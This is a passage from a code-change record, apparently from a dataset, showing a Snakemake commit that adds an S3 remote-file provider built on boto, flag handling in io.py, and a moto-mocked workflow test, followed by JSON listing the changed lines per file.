snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket\/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^\/]*)\/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket\/key': %s\" %\n+                                  self.file())\ndiff --git a\/snakemake\/remote_providers\/__init__.py b\/snakemake\/remote_providers\/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a\/snakemake\/remote_providers\/implementations\/S3.py b\/snakemake\/remote_providers\/implementations\/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/implementations\/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize \/ float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a\/snakemake\/rules.py b\/snakemake\/rules.py\nindex 3608167..5324eeb 100644\n--- a\/snakemake\/rules.py\n+++ b\/snakemake\/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a\/snakemake\/workflow.py b\/snakemake\/workflow.py\nindex b035bc3..833bd90 100644\n--- a\/snakemake\/workflow.py\n+++ b\/snakemake\/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a\/tests\/test_remote\/S3Mocked.py b\/tests\/test_remote\/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- \/dev\/null\n+++ b\/tests\/test_remote\/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a\/tests\/test_remote\/Snakefile b\/tests\/test_remote\/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- \/dev\/null\n+++ b\/tests\/test_remote\/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket\/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket\/out.txt .\/\")\n+\n+rule split:\n+    input: remote('test-remote-bucket\/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket\/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket\/prefix')\n+        for f in os.listdir(os.getcwd()+\"\/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket\/\"+f, \"test-remote-bucket\/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket\/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket\/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm .\/motoState.p\")\n+\n+onerror:\n+    shell(\"rm .\/motoState.p\")\n\\ No newline at end of file\ndiff --git a\/tests\/test_benchmark\/expected-results\/test.benchmark.json b\/tests\/test_remote\/__init__.py\nsimilarity index 100%\nrename from tests\/test_benchmark\/expected-results\/test.benchmark.json\nrename to tests\/test_remote\/__init__.py\ndiff --git a\/tests\/test_remote\/expected-results\/out.txt b\/tests\/test_remote\/expected-results\/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/expected-results\/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/test_remote\/test.txt b\/tests\/test_remote\/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/tests.py b\/tests\/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a\/tests\/tests.py\n+++ b\/tests\/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n","files":{"\/snakemake\/dag.py":{"changes":[{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]},{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]},"\/snakemake\/io.py":{"changes":[{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]},{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, 